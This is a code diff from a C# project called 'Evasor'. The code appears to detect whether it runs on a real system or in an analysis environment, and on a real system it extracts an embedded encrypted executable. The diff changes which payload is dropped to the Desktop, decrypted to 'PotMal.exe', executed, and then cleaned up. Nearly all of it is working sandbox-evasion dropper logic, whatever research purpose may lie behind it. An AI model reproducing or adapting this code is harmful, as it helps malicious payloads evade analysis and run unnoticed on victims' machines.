@@ -1285,10 +1285,11 @@ namespace Evasor
                 File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RealOrAnalysis.txt", "Real system detected");
                 try
                 {
-                    //using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("Evasor.otptEnc.exe"))
-                    using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("Evasor.sampleMalEnc.exe"))
+                    using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("Evasor.EncPotMal.exe"))
+                    //using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("Evasor.sampleMalEnc.exe"))
                     {
-                        using (FileStream fileStream = new FileStream(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "Evasor.sampleMalEnc.exe"), FileMode.Create))
+                        using (FileStream fileStream = new FileStream(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "Evasor.EncPotMal.exe"), FileMode.Create))
+                        //using (FileStream fileStream = new FileStream(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "Evasor.sampleMalEnc.exe"), FileMode.Create))
                         {
                             for (int i = 0; i < stream.Length; i++)
                             {
@@ -1306,8 +1307,10 @@ namespace Evasor
                 //calling Decrypt
                 try
                 {
-                    DecryptFile(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "Evasor.sampleMalEnc.exe"),
+                    DecryptFile(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "Evasor.EncPotMal.exe"),
                         Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "PotMal.exe"));
+                    //DecryptFile(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "Evasor.sampleMalEnc.exe"),
+                    //  Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "PotMal.exe"));
                     //Start Mal/exec
                     try
                     {
@@ -1322,7 +1325,8 @@ namespace Evasor
                         otpt += "\nUnable to execute PotMal.exe" + "###############################";
                     }
                     //Delete file
-                    File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Evasor.sampleMalEnc.exe");
+                    //File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Evasor.sampleMalEnc.exe");
+                    File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Evasor.EncPotMal.exe");
                 }
                 catch
                 {
